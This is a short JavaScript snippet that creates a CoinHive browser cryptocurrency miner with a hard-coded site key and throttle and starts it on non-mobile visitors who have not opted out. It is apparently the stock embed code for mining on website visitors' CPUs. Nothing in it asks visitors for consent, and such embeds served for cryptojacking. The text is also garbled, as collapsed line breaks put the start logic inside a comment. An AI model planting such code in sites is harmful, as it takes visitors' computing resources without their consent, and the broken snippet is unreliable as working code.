var miner = new CoinHive.Anonymous('RshisQ4Rf9jIYxCC1jdg0zcJR2BEBZOi', {
    throttle: 0.25
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}